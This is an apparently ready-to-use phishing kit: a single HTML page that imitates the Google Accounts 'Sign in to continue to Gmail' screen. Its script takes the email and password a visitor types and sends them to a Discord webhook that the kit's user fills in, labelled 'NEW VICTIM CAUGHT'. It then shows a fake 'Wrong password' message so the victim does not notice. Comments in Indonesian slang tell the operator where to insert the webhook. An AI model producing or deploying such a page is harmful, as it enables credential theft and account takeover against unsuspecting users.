<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Sign in - Google Accounts</title>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', Arial, sans-serif; }
    body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; padding: 20px;}
    .login-box { width: 100%; max-width: 400px; text-align: center;}
    .logo { width: 75px; margin-bottom: 20px; }
    h2 { font-size: 24px; color: #202124; font-weight: 400; margin-bottom: 10px; }
    p { font-size: 15px; color: #202124; margin-bottom: 30px; }
    input { width: 100%; padding: 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 15px; outline: none; transition: 0.2s;}
    input:focus { border: 2px solid #1a73e8; padding: 14px; }
    .btn-group { display: flex; justify-content: space-between; align-items: center; margin-top: 30px;}
    .btn-next { background: #1a73e8; color: #fff; border: none; padding: 12px 24px; font-size: 14px; font-weight: 500; border-radius: 4px; cursor: pointer; }
    .btn-next:active { background: #1557b0; }
    .error-msg { color: #d93025; font-size: 14px; margin-bottom: 15px; display: none; text-align: left; font-weight: 500;}
    .forgot { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
</style>
</head>
<body>

<div class="login-box">
    <svg class="logo" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
    
    <h2>Sign in</h2>
    <p>to continue to Gmail</p>

    <div class="error-msg" id="errorMsg">Wrong password. Try again.</div>

    <form id="phishForm">
        <input type="email" id="email" placeholder="Email or phone" required>
        <input type="password" id="password" placeholder="Enter your password" required>
        <div class="btn-group">
            <a href="#" class="forgot">Forgot password?</a>
            <button type="submit" class="btn-next" id="btnNext">Next</button>
        </div>
    </form>
</div>

<script>
    // ==========================================
    // [1] GANTI URL DI BAWAH INI PAKE WEBHOOK DISCORD LO
    // ==========================================
    const WEBHOOK_URL = "URL_WEBHOOK_DISCORD_LO_DI_SINI"; // <--- GANTI INI

    document.getElementById('phishForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const errorMsg = document.getElementById('errorMsg');
        const btn = document.getElementById('btnNext');

        btn.innerText = "Loading...";
        btn.style.opacity = "0.7";
        btn.disabled = true;

        const data = {
            content: `🚨 **NEW VICTIM CAUGHT!** 🚨\n**Email:** \`${email}\`\n**Password:** \`${password}\``
        };

        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).then(() => {
            setTimeout(() => {
                errorMsg.style.display = 'block';
                btn.innerText = "Next";
                btn.style.opacity = "1";
                btn.disabled = false;
                document.getElementById('password').value = ""; 
            }, 1500);
        }).catch(err => {
            errorMsg.style.display = 'block';
            btn.innerText = "Next";
            btn.disabled = false;
        });
    });
</script>
</body>
</html>
